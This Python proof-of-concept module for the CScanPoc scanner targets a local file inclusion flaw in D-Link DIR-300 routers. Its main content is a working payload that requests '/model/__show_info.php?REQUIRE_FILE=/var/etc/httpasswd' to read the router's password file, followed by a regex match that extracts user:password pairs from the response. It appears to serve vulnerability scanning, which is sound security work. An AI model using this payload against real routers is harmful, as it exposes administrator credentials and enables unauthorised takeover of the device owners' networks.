# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import time
import re


class Vuln(ABVuln):
    vuln_id = 'D-Link_0005'  # 平台漏洞编号，留空
    name = 'D-Link 文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        D-Link DIR-300 文件包含漏洞路由密码直接读取。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=066799'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'D-Link'  # 漏洞应用名称
    product_version = 'DIR-300'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cfe8dc47-dd63-4d83-be26-d1d50b3a8086'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            """
            POC Name  :  D-Link DIR-300 文件包含漏洞
            Author    :  a
            mail      :  a@lcx.cc
            Referer   :  http://www.wooyun.org/bugs/wooyun-2010-066799
            """
            hh = hackhttp.hackhttp()
            payload = '/model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd'
            url = self.target + payload
            code, head, res, errcode, _ = hh.http(url)
            start = res.find('Main Content Start ')
            end = res.find('Main Content End')
            if res.find(':', start, end) != -1 and code == 200:
                m = re.search(r"(\w+):(\w+)", res)
                if m:
                    #security_hole('/var/etc/httpasswd:' + m.group(0))
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
